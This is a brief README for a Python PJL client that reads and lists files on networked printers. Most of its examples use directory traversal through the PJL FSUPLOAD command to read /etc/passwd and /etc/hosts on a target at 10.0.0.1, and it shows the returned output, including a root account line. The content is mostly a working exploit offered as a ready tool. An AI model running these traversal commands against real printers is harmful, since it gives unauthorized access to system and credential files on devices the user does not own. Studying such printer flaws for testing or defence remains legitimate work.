# PJL-Client

Usage: python pjlclient.py <IP> <dir|read> <path/file>

Examples:

$python pjlclient.py 10.0.0.1 dir 0:/pcl/macros<br/>
$python pjlclient.py 10.0.0.1 read 0:/pcl/macros/file.pcl<br/>
$python pjlclient.py 10.0.0.1 read 0:\\..\\..\\..\\etc\\passwd

@PJL FSUPLOAD FORMAT:BINARY NAME="0:\..\..\..\etc\passwd" OFFSET=0 SIZE=23<br/>
root::0:0::/:/bin/dlsh

$python pjlclient.py 10.0.0.1 read 0:\\..\\..\\..\\etc\\hosts

@PJL FSUPLOAD FORMAT:BINARY NAME="0:\..\..\..\etc\hosts" OFFSET=0 SIZE=362<br/>
127.0.0.1		localhost mailhost loghost
